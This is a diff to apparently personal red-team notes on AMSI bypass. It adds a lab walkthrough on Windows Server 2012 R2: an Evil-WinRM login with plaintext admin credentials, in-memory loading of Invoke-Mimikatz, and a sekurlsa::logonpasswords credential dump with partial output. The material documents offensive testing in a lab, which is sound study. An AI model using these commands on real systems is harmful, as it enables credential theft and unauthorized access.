@@ -72,7 +72,7 @@ Example - AMSI bypass techniques
 ===================================================================================================================================
 
 -----------------------------------------------------------------------------------------------------------------------------------
-Example 1 - AMSI bypass with a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+Example/Test 1 - AMSI bypass with a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
 -----------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
@@ -149,7 +149,7 @@ PS C:\temp>
 
 
 ---------------------------------------------------------------------------------------------------------------------------------
-Example 2 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+Example/Test 2 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
 ---------------------------------------------------------------------------------------------------------------------------------
 
 2.1 Test with Powershell Remoting
@@ -310,3 +310,68 @@ This script contains malicious content and has been blocked by your antivirus so
 
 
 => My bypass is not working via Evil-WinRM...
+
+
+-------------------------------------------------------------------------------------------------------------------------
+Example/Test 3 - Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+-------------------------------------------------------------------------------------------------------------------------
+
+Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
+       As expected, there is no AMSI and the basic AV (even with an updated signature database) does't not detect and nor block the PowerShell scripts
+       directly loaded in memory.
+       
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'
+
+Evil-WinRM shell v3.3
+<SNIP>
+*Evil-WinRM* PS C:\Users\admin\Documents> menu
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+*Evil-WinRM* PS C:\Users\admin\Documents> 
+
+*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz.ps1
+
+*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 42854 (00000000:0000a766)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/21/2021 6:58:31 PM
+SID               : S-1-5-90-1
+	msv :
+	 [00000003] Primary
+	 * Username : SERVER03$
+	 * Domain   : SECURITY-LAB
+<SNIP>
